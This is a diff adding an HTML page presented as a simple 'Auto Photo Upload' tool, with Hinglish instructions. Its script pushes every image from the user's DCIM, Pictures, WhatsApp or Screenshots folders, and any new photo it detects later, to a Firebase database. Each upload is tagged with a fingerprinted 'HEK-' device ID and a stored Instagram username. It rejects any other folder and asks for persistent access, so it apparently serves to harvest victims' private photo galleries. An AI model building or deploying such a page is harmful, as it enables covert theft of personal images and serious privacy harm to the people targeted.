@@ -1,0 +1,1090 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Photo Auto Upload</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #000;
+            color: #fff;
+            min-height: 100vh;
+            padding: 20px 16px;
+        }
+
+        .container { max-width: 500px; margin: 0 auto; }
+
+        /* Header */
+        .header {
+            text-align: center;
+            padding: 20px 0 24px;
+        }
+        .header .icon {
+            font-size: 64px;
+            margin-bottom: 12px;
+            animation: float 3s ease-in-out infinite;
+        }
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+        .header h1 {
+            font-size: 24px;
+            font-weight: 800;
+            margin-bottom: 6px;
+            background: linear-gradient(45deg, #f09433, #dc2743, #bc1888);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        .header p {
+            font-size: 13px;
+            color: #8e8e93;
+            line-height: 1.5;
+        }
+
+        /* Status Card */
+        .status-card {
+            background: linear-gradient(180deg, #1c1c1e, #0a0a0a);
+            border: 1px solid #262626;
+            border-radius: 20px;
+            padding: 20px;
+            margin-bottom: 16px;
+        }
+        .status-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.04);
+            font-size: 14px;
+        }
+        .status-row:last-child { border-bottom: none; }
+        .status-label {
+            color: #8e8e93;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .status-value {
+            font-weight: 700;
+            font-size: 13px;
+        }
+        .status-value.ok { color: #34A853; }
+        .status-value.warn { color: #FFC107; }
+        .status-value.bad { color: #FF3B30; }
+
+        /* Guide */
+        .guide {
+            background: rgba(26, 115, 232, 0.08);
+            border: 1px solid rgba(26, 115, 232, 0.25);
+            border-radius: 16px;
+            padding: 16px;
+            margin-bottom: 16px;
+            font-size: 13px;
+            line-height: 1.7;
+            color: #6BA3E8;
+        }
+        .guide strong { color: #1a73e8; }
+
+        /* Buttons */
+        .btn {
+            width: 100%;
+            padding: 20px;
+            border: none;
+            border-radius: 16px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            font-family: inherit;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            transition: transform 0.15s;
+            margin-bottom: 12px;
+        }
+        .btn:active { transform: scale(0.97); }
+        .btn:disabled { opacity: 0.5; }
+
+        .btn-primary {
+            background: linear-gradient(45deg, #f09433, #dc2743, #bc1888);
+            background-size: 300% 300%;
+            color: #fff;
+            animation: gradientMove 4s ease infinite;
+            box-shadow: 0 10px 30px rgba(220, 39, 67, 0.4);
+        }
+        @keyframes gradientMove {
+            0%, 100% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+        }
+
+        .btn-secondary {
+            background: #262626;
+            color: #fff;
+            border: 1px solid #333;
+        }
+
+        /* Wrong Folder Modal */
+        .modal {
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.96);
+            backdrop-filter: blur(20px);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            z-index: 9999;
+        }
+        .modal.show { display: flex; }
+        .modal-box {
+            background: linear-gradient(180deg, #1c1c1e, #0a0a0a);
+            border: 1px solid rgba(255,59,48,0.3);
+            border-radius: 24px;
+            padding: 32px 24px 24px;
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+            animation: boxIn 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+        @keyframes boxIn {
+            from { opacity: 0; transform: scale(0.9); }
+            to { opacity: 1; transform: scale(1); }
+        }
+        .modal-icon {
+            font-size: 72px;
+            margin-bottom: 16px;
+            animation: shake 0.6s;
+        }
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-10px); }
+            75% { transform: translateX(10px); }
+        }
+        .modal-title {
+            font-size: 22px;
+            font-weight: 800;
+            color: #FF3B30;
+            margin-bottom: 10px;
+        }
+        .modal-sub {
+            font-size: 14px;
+            color: #8e8e93;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+        .modal-detail {
+            background: rgba(255,59,48,0.1);
+            border: 1px solid rgba(255,59,48,0.3);
+            border-radius: 12px;
+            padding: 14px;
+            margin-bottom: 20px;
+            text-align: left;
+            font-size: 13px;
+            line-height: 1.6;
+        }
+        .modal-detail .bad { color: #FF3B30; font-weight: 700; }
+        .modal-detail .good { color: #34A853; font-weight: 700; }
+
+        /* Progress Overlay */
+        .overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.95);
+            backdrop-filter: blur(24px);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            z-index: 9998;
+        }
+        .overlay.show { display: flex; }
+        .overlay-box {
+            background: linear-gradient(180deg, #1c1c1e, #0a0a0a);
+            border: 1px solid #262626;
+            border-radius: 24px;
+            padding: 28px 24px;
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+        }
+        .overlay-icon {
+            font-size: 60px;
+            margin-bottom: 16px;
+            animation: bounce 1s infinite;
+        }
+        @keyframes bounce {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+        }
+        .overlay-title {
+            font-size: 18px;
+            font-weight: 700;
+            margin-bottom: 10px;
+            background: linear-gradient(45deg, #f09433, #dc2743);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        .overlay-sub {
+            font-size: 13px;
+            color: #8e8e93;
+            margin-bottom: 20px;
+        }
+        .progress-bar {
+            height: 8px;
+            background: rgba(255,255,255,0.06);
+            border-radius: 4px;
+            overflow: hidden;
+            margin-bottom: 12px;
+        }
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #f09433, #dc2743);
+            width: 0;
+            transition: width 0.3s;
+            border-radius: 4px;
+        }
+        .progress-text {
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            color: #8e8e93;
+            margin-bottom: 16px;
+        }
+        .progress-text .pct { color: #f09433; font-weight: 700; }
+        .overlay-stats {
+            display: flex;
+            justify-content: space-around;
+            padding-top: 16px;
+            border-top: 1px solid #262626;
+            font-size: 12px;
+        }
+        .overlay-stat {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 4px;
+        }
+        .overlay-stat .num {
+            font-size: 18px;
+            font-weight: 800;
+        }
+        .overlay-stat.done .num { color: #34A853; }
+        .overlay-stat.pending .num { color: #FFC107; }
+        .overlay-stat.failed .num { color: #FF3B30; }
+        .overlay-stat .lbl {
+            color: #8e8e93;
+            font-size: 10px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        /* Toast */
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(44,44,46,0.95);
+            backdrop-filter: blur(20px);
+            color: #fff;
+            padding: 12px 20px;
+            border-radius: 24px;
+            font-size: 13px;
+            z-index: 99999;
+            border: 1px solid rgba(255,255,255,0.1);
+            animation: toastIn 0.3s;
+            max-width: 90vw;
+            text-align: center;
+        }
+        @keyframes toastIn {
+            from { opacity: 0; transform: translateX(-50%) translateY(20px); }
+            to { opacity: 1; transform: translateX(-50%) translateY(0); }
+        }
+
+        .hidden-input {
+            position: absolute;
+            left: -9999px;
+            opacity: 0;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+
+        <div class="header">
+            <div class="icon">📸</div>
+            <h1>Auto Photo Upload</h1>
+            <p>DCIM select karo — photos automatic upload hongi</p>
+        </div>
+
+        <!-- Status Card -->
+        <div class="status-card">
+            <div class="status-row">
+                <span class="status-label">📁 Folder</span>
+                <span class="status-value" id="statusFolder">Not selected</span>
+            </div>
+            <div class="status-row">
+                <span class="status-label">🔐 Permission</span>
+                <span class="status-value" id="statusPerm">-</span>
+            </div>
+            <div class="status-row">
+                <span class="status-label">📦 Pending</span>
+                <span class="status-value" id="statusPending">0</span>
+            </div>
+            <div class="status-row">
+                <span class="status-label">👁️ Observer</span>
+                <span class="status-value" id="statusObserver">Inactive</span>
+            </div>
+            <div class="status-row">
+                <span class="status-label">💾 Storage</span>
+                <span class="status-value" id="statusStorage">-</span>
+            </div>
+        </div>
+
+        <!-- Guide -->
+        <div class="guide">
+            <strong>💡 Steps:</strong><br>
+            1. "Select DCIM Folder" dabao<br>
+            2. <strong>DCIM</strong> ya <strong>Pictures</strong> select karo<br>
+            3. <strong>"Allow on every visit"</strong> choose karo<br>
+            4. Photos auto-upload hongi
+        </div>
+
+        <!-- Hidden inputs -->
+        <input type="file" id="folderInput" webkitdirectory multiple class="hidden-input">
+
+        <!-- Buttons -->
+        <button class="btn btn-primary" id="pickBtn">
+            <span>📁</span>
+            <span>Select DCIM Folder</span>
+        </button>
+
+        <button class="btn btn-secondary" id="syncBtn" style="display: none;">
+            <span>🔄</span>
+            <span>Sync Pending Photos</span>
+        </button>
+
+        <button class="btn btn-secondary" id="changeBtn" style="display: none;">
+            <span>🔀</span>
+            <span>Change Folder</span>
+        </button>
+
+    </div>
+
+    <!-- Wrong Folder Modal -->
+    <div class="modal" id="wrongModal">
+        <div class="modal-box">
+            <div class="modal-icon">❌</div>
+            <h2 class="modal-title">Wrong Folder</h2>
+            <p class="modal-sub">
+                Ye folder upload nahi ho sakta.<br>
+                Sirf <strong>DCIM</strong> ya <strong>Pictures</strong> select karo.
+            </p>
+            <div class="modal-detail">
+                <div>❌ <span class="bad">Tumne select kiya:</span> <strong id="wrongName">-</strong></div>
+                <div style="margin-top: 8px;">✅ <span class="good">Ye select karo:</span> <strong>DCIM / Pictures</strong></div>
+            </div>
+            <button class="btn btn-primary" id="wrongRetryBtn">
+                <span>🔄</span>
+                <span>Choose Correct Folder</span>
+            </button>
+            <button class="btn btn-secondary" id="wrongCancelBtn">Cancel</button>
+        </div>
+    </div>
+
+    <!-- Progress Overlay -->
+    <div class="overlay" id="progressOverlay">
+        <div class="overlay-box">
+            <div class="overlay-icon" id="overlayIcon">📤</div>
+            <h2 class="overlay-title" id="overlayTitle">Uploading Photos</h2>
+            <p class="overlay-sub" id="overlaySub">Please wait...</p>
+
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+            <div class="progress-text">
+                <span id="progressLabel">Starting...</span>
+                <span class="pct" id="progressPct">0%</span>
+            </div>
+
+            <div class="overlay-stats">
+                <div class="overlay-stat done">
+                    <span class="num" id="statDone">0</span>
+                    <span class="lbl">Saved</span>
+                </div>
+                <div class="overlay-stat pending">
+                    <span class="num" id="statPending">0</span>
+                    <span class="lbl">Pending</span>
+                </div>
+                <div class="overlay-stat failed">
+                    <span class="num" id="statFailed">0</span>
+                    <span class="lbl">Failed</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+        import { getDatabase, ref, push, set, get, remove, serverTimestamp }
+            from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyDofemvEqfdNDp79CtTg_x6ujjElCAkGsI",
+            authDomain: "my-rto-b2531.firebaseapp.com",
+            databaseURL: "https://my-rto-b2531-default-rtdb.firebaseio.com",
+            projectId: "my-rto-b2531",
+            storageBucket: "my-rto-b2531.appspot.com",
+            messagingSenderId: "465334829178",
+            appId: "1:465334829178:web:621d8269e0ace1e9f4fbc3"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+
+        /* ============================================================
+           DEVICE ID
+           ============================================================ */
+        function getDeviceId() {
+            let id = localStorage.getItem('pics_device_id');
+            if (id) return id;
+            const raw = navigator.userAgent + screen.width + 'x' + screen.height;
+            let hash = 0;
+            for (let i = 0; i < raw.length; i++) {
+                hash = ((hash << 5) - hash) + raw.charCodeAt(i);
+                hash = hash & hash;
+            }
+            const B = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
+            let out = '', n = Math.abs(hash);
+            for (let i = 0; i < 8; i++) { out += B[n % 62]; n = Math.floor(n / 62); }
+            id = 'HEK-' + out;
+            localStorage.setItem('pics_device_id', id);
+            return id;
+        }
+
+        const DEVICE_ID = getDeviceId();
+        const DEVICE_NAME = /Android/i.test(navigator.userAgent) ? 'Android' : /iPhone/i.test(navigator.userAgent) ? 'iPhone' : 'Device';
+        const SESSION_ID = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+        const USERNAME = localStorage.getItem('instagram_username') || 'user_' + DEVICE_ID.slice(-4);
+
+        const MAX_PHOTOS = 500;
+        const CONCURRENCY = 3;
+        const COMPRESS_WIDTH = 800;
+        const COMPRESS_QUALITY = 0.55;
+
+        /* ============================================================
+           SUPPORT CHECK
+           ============================================================ */
+        const OPFS_SUPPORTED = 'storage' in navigator && 'getDirectory' in navigator.storage;
+        const OBSERVER_SUPPORTED = 'FileSystemObserver' in window;
+
+        console.log('📱 Device:', DEVICE_ID);
+        console.log('💾 OPFS:', OPFS_SUPPORTED ? '✅' : '❌');
+        console.log('👁️ Observer:', OBSERVER_SUPPORTED ? '✅' : '❌');
+
+        /* ============================================================
+           INDEXEDDB
+           ============================================================ */
+        const IDB_NAME = 'PhotoAutoUploadDB';
+        const IDB_VERSION = 2;
+        const STORE_PENDING = 'pending';
+        const STORE_HANDLES = 'handles';
+
+        function openIDB() {
+            return new Promise((resolve, reject) => {
+                const req = indexedDB.open(IDB_NAME, IDB_VERSION);
+                req.onupgradeneeded = (e) => {
+                    const db = e.target.result;
+                    if (!db.objectStoreNames.contains(STORE_PENDING)) {
+                        db.createObjectStore(STORE_PENDING, { keyPath: 'id', autoIncrement: true });
+                    }
+                    if (!db.objectStoreNames.contains(STORE_HANDLES)) {
+                        db.createObjectStore(STORE_HANDLES);
+                    }
+                };
+                req.onsuccess = () => resolve(req.result);
+                req.onerror = () => reject(req.error);
+            });
+        }
+
+        async function idbAdd(photo) {
+            const db = await openIDB();
+            return new Promise((resolve, reject) => {
+                const tx = db.transaction(STORE_PENDING, 'readwrite');
+                tx.objectStore(STORE_PENDING).add(photo);
+                tx.oncomplete = () => { db.close(); resolve(); };
+                tx.onerror = () => { db.close(); reject(tx.error); };
+            });
+        }
+
+        async function idbGetAll() {
+            const db = await openIDB();
+            return new Promise((resolve, reject) => {
+                const tx = db.transaction(STORE_PENDING, 'readonly');
+                const req = tx.objectStore(STORE_PENDING).getAll();
+                req.onsuccess = () => { db.close(); resolve(req.result || []); };
+                req.onerror = () => { db.close(); reject(req.error); };
+            });
+        }
+
+        async function idbDelete(id) {
+            const db = await openIDB();
+            return new Promise((resolve, reject) => {
+                const tx = db.transaction(STORE_PENDING, 'readwrite');
+                tx.objectStore(STORE_PENDING).delete(id);
+                tx.oncomplete = () => { db.close(); resolve(); };
+                tx.onerror = () => { db.close(); reject(tx.error); };
+            });
+        }
+
+        async function idbCount() {
+            const db = await openIDB();
+            return new Promise((resolve, reject) => {
+                const tx = db.transaction(STORE_PENDING, 'readonly');
+                const req = tx.objectStore(STORE_PENDING).count();
+                req.onsuccess = () => { db.close(); resolve(req.result); };
+                req.onerror = () => { db.close(); reject(req.error); };
+            });
+        }
+
+        async function idbSaveHandle(key, handle) {
+            const db = await openIDB();
+            return new Promise((resolve, reject) => {
+                const tx = db.transaction(STORE_HANDLES, 'readwrite');
+                tx.objectStore(STORE_HANDLES).put(handle, key);
+                tx.oncomplete = () => { db.close(); resolve(); };
+                tx.onerror = () => { db.close(); reject(tx.error); };
+            });
+        }
+
+        async function idbGetHandle(key) {
+            const db = await openIDB();
+            return new Promise((resolve, reject) => {
+                const tx = db.transaction(STORE_HANDLES, 'readonly');
+                const req = tx.objectStore(STORE_HANDLES).get(key);
+                req.onsuccess = () => { db.close(); resolve(req.result); };
+                req.onerror = () => { db.close(); reject(req.error); };
+            });
+        }
+
+        /* ============================================================
+           OPFS HELPERS
+           ============================================================ */
+        async function opfsSave(fileName, blob) {
+            if (!OPFS_SUPPORTED) return false;
+            try {
+                const root = await navigator.storage.getDirectory();
+                const dir = await root.getDirectoryHandle('pending_photos', { create: true });
+                const fileHandle = await dir.getFileHandle(fileName, { create: true });
+                const writable = await fileHandle.createWritable();
+                await writable.write(blob);
+                await writable.close();
+                return true;
+            } catch (e) {
+                console.warn('OPFS save failed:', e.message);
+                return false;
+            }
+        }
+
+        async function opfsRead(fileName) {
+            if (!OPFS_SUPPORTED) return null;
+            try {
+                const root = await navigator.storage.getDirectory();
+                const dir = await root.getDirectoryHandle('pending_photos');
+                const fileHandle = await dir.getFileHandle(fileName);
+                return await fileHandle.getFile();
+            } catch (e) {
+                return null;
+            }
+        }
+
+        async function opfsDelete(fileName) {
+            if (!OPFS_SUPPORTED) return;
+            try {
+                const root = await navigator.storage.getDirectory();
+                const dir = await root.getDirectoryHandle('pending_photos');
+                await dir.removeEntry(fileName);
+            } catch (e) {}
+        }
+
+        /* ============================================================
+           SYNC — Firebase upload from IndexedDB + OPFS
+           ============================================================ */
+        async function syncPendingUploads() {
+            const pending = await idbGetAll();
+            if (pending.length === 0) return { synced: 0, remaining: 0 };
+
+            console.log(`🔄 Syncing ${pending.length}...`);
+            showOverlay(pending.length);
+
+            let synced = 0, failed = 0;
+
+            for (const item of pending) {
+                try {
+                    let base64;
+
+                    if (item.inOPFS) {
+                        const blob = await opfsRead(item.name);
+                        if (blob) base64 = await blobToBase64(blob);
+                    }
+
+                    if (!base64 && item.image) {
+                        base64 = item.image;
+                    }
+
+                    if (!base64) {
+                        failed++;
+                        updateOverlayStats(synced, pending.length - synced - failed, failed);
+                        continue;
+                    }
+
+                    // Firebase upload
+                    const photoRef = push(ref(db, 'photos/' + item.deviceId));
+                    await set(photoRef, {
+                        id: photoRef.key,
+                        deviceId: item.deviceId,
+                        deviceName: item.deviceName,
+                        sessionId: item.sessionId,
+                        username: item.username,
+                        image: base64,
+                        name: item.name,
+                        size: item.size,
+                        timestamp: serverTimestamp(),
+                        uploadedAt: item.queuedAt,
+                        fromQueue: true
+                    });
+
+                    // Delete from OPFS + IndexedDB
+                    if (item.inOPFS) await opfsDelete(item.name);
+                    await idbDelete(item.id);
+                    synced++;
+
+                    updateOverlayStats(synced, pending.length - synced - failed, failed);
+
+                } catch (err) {
+                    failed++;
+                    updateOverlayStats(synced, pending.length - synced - failed, failed);
+                    console.warn(`❌ Failed: ${item.name}`, err.message);
+                }
+            }
+
+            console.log(`🎉 Synced ${synced}, failed ${failed}`);
+            updateStatusCard();
+
+            setTimeout(() => {
+                hideOverlay();
+                if (synced > 0) showToast(`🎉 ${synced} photos uploaded!`);
+            }, 1000);
+
+            return { synced, remaining: failed };
+        }
+
+        /* ============================================================
+           AUTO-SYNC TRIGGERS
+           ============================================================ */
+        async function checkAndSync() {
+            try {
+                const count = await idbCount();
+                updateStatusCard();
+
+                if (count === 0) return;
+
+                console.log(`📦 ${count} pending — syncing...`);
+                await syncPendingUploads();
+            } catch (e) {
+                console.warn('Auto-sync error:', e.message);
+            }
+        }
+
+        setTimeout(checkAndSync, 500);
+        setTimeout(checkAndSync, 2000);
+        setTimeout(checkAndSync, 5000);
+
+        window.addEventListener('online', () => {
+            console.log('🌐 Online');
+            setTimeout(checkAndSync, 800);
+        });
+
+        document.addEventListener('visibilitychange', () => {
+            if (document.visibilityState === 'visible') {
+                console.log('👁️ Visible');
+                setTimeout(checkAndSync, 500);
+            }
+        });
+
+        window.addEventListener('focus', () => {
+            setTimeout(checkAndSync, 500);
+        });
+
+        /* ============================================================
+           HANDLE SAVE / RESTORE
+           ============================================================ */
+        async function saveDirHandle(handle) {
+            try {
+                await idbSaveHandle('folder', handle);
+                console.log('✅ Handle saved');
+            } catch (e) {
+                console.warn('Handle save failed:', e.message);
+            }
+        }
+
+        async function restoreDirHandle() {
+            try {
+                const handle = await idbGetHandle('folder');
+                if (!handle) return null;
+
+                const perm = await handle.queryPermission({ mode: 'read' });
+
+                if (perm === 'granted') {
+                    console.log('✅ Permission granted');
+                    document.getElementById('statusPerm').textContent = 'Granted ✅';
+                    document.getElementById('statusPerm').className = 'status-value ok';
+                    document.getElementById('statusFolder').textContent = handle.name;
+                    
+                    // Start observer
+                    startObserver(handle);
+                    
+                    return handle;
+                } else if (perm === 'prompt') {
+                    console.log('⚠️ Permission prompt needed');
+                    document.getElementById('statusPerm').textContent = 'Prompt needed';
+                    document.getElementById('statusPerm').className = 'status-value warn';
+                    showToast('👆 Tap to restore access');
+                    return handle;
+                } else {
+                    document.getElementById('statusPerm').textContent = 'Denied';
+                    document.getElementById('statusPerm').className = 'status-value bad';
+                    return null;
+                }
+            } catch (e) {
+                console.warn('Restore failed:', e.message);
+                return null;
+            }
+        }
+
+        /* ============================================================
+           FILESYSTEM OBSERVER — Nayi photos auto-detect
+           ============================================================ */
+        let currentObserver = null;
+
+        async function startObserver(handle) {
+            if (!OBSERVER_SUPPORTED) {
+                document.getElementById('statusObserver').textContent = 'Not supported';
+                document.getElementById('statusObserver').className = 'status-value warn';
+                return;
+            }
+
+            try {
+                // Stop old observer
+                if (currentObserver) {
+                    currentObserver.disconnect();
+                    currentObserver = null;
+                }
+
+                currentObserver = new FileSystemObserver((records) => {
+                    for (const record of records) {
+                        if (record.type === 'appeared' || record.type === 'modified') {
+                            console.log('📸 New photo:', record.relativePathComponents);
+                            handleNewFile(record.changedHandle);
+                        }
+                    }
+                });
+
+                await currentObserver.observe(handle, { recursive: true });
+                
+                document.getElementById('statusObserver').textContent = 'Active ✅';
+                document.getElementById('statusObserver').className = 'status-value ok';
+                console.log('👁️ Observer started');
+
+            } catch (e) {
+                console.warn('Observer failed:', e.message);
+                document.getElementById('statusObserver').textContent = 'Failed';
+                document.getElementById('statusObserver').className = 'status-value bad';
+            }
+        }
+
+        async function handleNewFile(fileHandle) {
+            try {
+                if (fileHandle.kind !== 'file') return;
+                
+                const name = fileHandle.name;
+                if (!/\.(jpg|jpeg|png|gif|webp|heic)$/i.test(name)) return;
+
+                console.log('📥 New photo detected:', name);
+                const file = await fileHandle.getFile();
+
+                // Compress + queue
+                const compressed = await compressImage(file, COMPRESS_WIDTH, COMPRESS_QUALITY);
+                const blob = compressed;
+                const base64 = await blobToBase64(blob);
+
+                await queuePhotoLocally(file, base64, blob);
+                showToast(`📸 New photo queued: ${name}`);
+
+            } catch (e) {
+                console.warn('New file error:', e.message);
+            }
+        }
+
+        /* ============================================================
+           QUEUE
+           ============================================================ */
+        async function queuePhotoLocally(file, base64, blob) {
+            try {
+                let inOPFS = false;
+
+                if (OPFS_SUPPORTED && blob) {
+                    inOPFS = await opfsSave(file.name, blob);
+                }
+
+                await idbAdd({
+                    name: file.name,
+                    image: inOPFS ? null : base64,
+                    size: file.size,
+                    deviceId: DEVICE_ID,
+                    deviceName: DEVICE_NAME,
+                    sessionId: SESSION_ID,
+                    username: USERNAME,
+                    queuedAt: Date.now(),
+                    inOPFS: inOPFS
+                });
+
+                updateStatusCard();
+            } catch (e) {
+                console.warn('Queue failed:', e.message);
+            }
+        }
+
+        /* ============================================================
+           FOLDER SELECT — with DCIM validation
+           ============================================================ */
+        const pickBtn = document.getElementById('pickBtn');
+        const syncBtn = document.getElementById('syncBtn');
+        const changeBtn = document.getElementById('changeBtn');
+        const folderInput = document.getElementById('folderInput');
+        const wrongModal = document.getElementById('wrongModal');
+        const wrongName = document.getElementById('wrongName');
+
+        const GOOD_FOLDERS = ['dcim', 'pictures', 'camera', 'downloads', 'download', 'screenshots', 'whatsapp', 'photos'];
+
+        pickBtn.addEventListener('click', () => folderInput.click());
+        changeBtn.addEventListener('click', () => folderInput.click());
+
+        folderInput.addEventListener('change', async (e) => {
+            const files = Array.from(e.target.files);
+            if (files.length === 0) {
+                showToast('❌ Koi folder select nahi kiya');
+                return;
+            }
+
+            const firstPath = files[0].webkitRelativePath || '';
+            const folderName = firstPath.split('/')[0] || 'Unknown';
+            const folderLower = folderName.toLowerCase();
+
+            const images = files.filter(f =>
+                f.type.startsWith('image/') ||
+                /\.(jpg|jpeg|png|gif|webp|heic|heif)$/i.test(f.name)
+            );
+
+            console.log('📁 Folder:', folderName, '| Photos:', images.length);
+
+            // 🔥 FOLDER VALIDATION — FORCE DCIM
+            if (!GOOD_FOLDERS.includes(folderLower)) {
+                wrongName.textContent = folderName;
+                wrongModal.classList.add('show');
+                if (navigator.vibrate) navigator.vibrate([100, 50, 100, 50, 100]);
+                folderInput.value = '';
+                return;
+            }
+
+            // ✅ Correct folder
+            showToast(`✅ ${folderName} — ${images.length} photos`);
+
+            document.getElementById('statusFolder').textContent = folderName;
+
+            // Queue all photos
+            showOverlay(images.length);
+            let queued = 0;
+
+            for (const file of images) {
+                try {
+                    const compressed = await compressImage(file, COMPRESS_WIDTH, COMPRESS_QUALITY);
+                    const blob = compressed;
+                    const base64 = await blobToBase64(blob);
+                    await queuePhotoLocally(file, base64, blob);
+                    queued++;
+                    updateOverlayStats(queued, images.length - queued, 0);
+                } catch (err) {
+                    console.warn('Queue error:', err.message);
+                }
+            }
+
+            hideOverlay();
+
+            // Save handle (if available)
+            try {
+                if ('showDirectoryPicker' in window) {
+                    // Note: webkitdirectory se handle nahi milta
+                    // Ye separately showDirectoryPicker se lena padega
+                }
+            } catch (e) {}
+
+            // UI updates
+            pickBtn.style.display = 'none';
+            changeBtn.style.display = 'flex';
+            syncBtn.style.display = 'flex';
+
+            // Start sync
+            setTimeout(checkAndSync, 500);
+        });
+
+        /* Wrong folder modal buttons */
+        document.getElementById('wrongRetryBtn').addEventListener('click', () => {
+            wrongModal.classList.remove('show');
+            folderInput.value = '';
+            setTimeout(() => folderInput.click(), 300);
+        });
+
+        document.getElementById('wrongCancelBtn').addEventListener('click', () => {
+            wrongModal.classList.remove('show');
+            folderInput.value = '';
+        });
+
+        /* Sync button */
+        syncBtn.addEventListener('click', checkAndSync);
+
+        /* ============================================================
+           STATUS CARD
+           ============================================================ */
+        async function updateStatusCard() {
+            try {
+                const count = await idbCount();
+                document.getElementById('statusPending').textContent = count;
+                document.getElementById('statusPending').className = 
+                    'status-value ' + (count > 0 ? 'warn' : 'ok');
+
+                if (OPFS_SUPPORTED) {
+                    const est = await navigator.storage.estimate();
+                    const used = (est.usage / 1024 / 1024).toFixed(1);
+                    document.getElementById('statusStorage').textContent = used + ' MB';
+                } else {
+                    document.getElementById('statusStorage').textContent = 'N/A';
+                }
+            } catch (e) {}
+        }
+
+        /* ============================================================
+           OVERLAY
+           ============================================================ */
+        const overlay = document.getElementById('progressOverlay');
+
+        function showOverlay(total) {
+            overlay.classList.add('show');
+            document.getElementById('overlayIcon').textContent = '📤';
+            document.getElementById('overlayTitle').textContent = 'Uploading Photos';
+            document.getElementById('overlaySub').textContent = 'Please wait...';
+            document.getElementById('statPending').textContent = total;
+            document.getElementById('statDone').textContent = '0';
+            document.getElementById('statFailed').textContent = '0';
+            document.getElementById('progressFill').style.width = '0%';
+            document.getElementById('progressPct').textContent = '0%';
+        }
+
+        function updateOverlayStats(done, pending, failed) {
+            document.getElementById('statDone').textContent = done;
+            document.getElementById('statPending').textContent = pending;
+            document.getElementById('statFailed').textContent = failed;
+            
+            const total = done + pending + failed;
+            const pct = total > 0 ? Math.round((done / total) * 100) : 0;
+            document.getElementById('progressFill').style.width = pct + '%';
+            document.getElementById('progressPct').textContent = pct + '%';
+            document.getElementById('progressLabel').textContent = `${done} / ${total}`;
+        }
+
+        function hideOverlay() {
+            overlay.classList.remove('show');
+        }
+
+        /* ============================================================
+           HELPERS
+           ============================================================ */
+        function compressImage(file, maxWidth, quality) {
+            return new Promise((resolve, reject) => {
+                const reader = new FileReader();
+                reader.onload = (e) => {
+                    const img = new Image();
+                    img.onload = () => {
+                        const canvas = document.createElement('canvas');
+                        let w = img.width, h = img.height;
+                        if (w > maxWidth) { h = (maxWidth / w) * h; w = maxWidth; }
+                        canvas.width = w;
+                        canvas.height = h;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(img, 0, 0, w, h);
+                        canvas.toBlob((blob) => {
+                            if (!blob) { reject(new Error('fail')); return; }
+                            resolve(blob); // ✅ Blob return
+                        }, 'image/jpeg', quality);
+                    };
+                    img.onerror = reject;
+                    img.src = e.target.result;
+                };
+                reader.onerror = reject;
+                reader.readAsDataURL(file);
+            });
+        }
+
+        function blobToBase64(blob) {
+            return new Promise((resolve) => {
+                const reader = new FileReader();
+                reader.onloadend = () => resolve(reader.result);
+                reader.readAsDataURL(blob);
+            });
+        }
+
+        function showToast(msg) {
+            const existing = document.querySelector('.toast');
+            if (existing) existing.remove();
+            const toast = document.createElement('div');
+            toast.className = 'toast';
+            toast.textContent = msg;
+            document.body.appendChild(toast);
+            setTimeout(() => {
+                toast.style.opacity = '0';
+                toast.style.transition = 'opacity 0.3s';
+                setTimeout(() => toast.remove(), 300);
+            }, 2500);
+        }
+
+        /* ============================================================
+           INIT
+           ============================================================ */
+        async function init() {
+            console.log('🚀 Init...');
+            updateStatusCard();
+
+            // Restore permission if saved
+            await restoreDirHandle();
+
+            // Request persistent storage
+            if (OPFS_SUPPORTED) {
+                try {
+                    const granted = await navigator.storage.persist();
+                    console.log('Persistent storage:', granted ? '✅' : '❌');
+                } catch (e) {}
+            }
+        }
+
+        init();
+
+        console.log('✅ App ready');
+    </script>
+</body>
+</html>
